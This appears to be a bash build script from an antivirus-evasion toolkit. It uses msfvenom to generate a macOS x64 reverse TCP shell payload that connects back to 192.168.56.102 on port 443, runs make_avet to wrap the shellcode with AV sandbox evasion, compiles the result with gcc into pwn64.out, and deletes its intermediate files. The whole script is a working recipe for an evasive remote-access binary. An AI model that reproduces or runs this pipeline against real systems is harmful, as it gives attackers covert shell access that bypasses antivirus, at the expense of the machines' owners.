#!/bin/bash          
# make reverse payload
msfvenom -p osx/x64/shell_reverse_tcp -b "\x00" EXITFUNC=process LHOST=192.168.56.102 LPORT=443 --platform OSX -f c > sc.txt
# call make_avet, the -f compiles the shellcode to the exe file, the -F is for the AV sandbox evasion 
./make_avet -f sc.txt -p 
# compile for 64bit
gcc -o pwn64.out avet.c
# cleanup
rm sc.txt && echo "" > defs.h
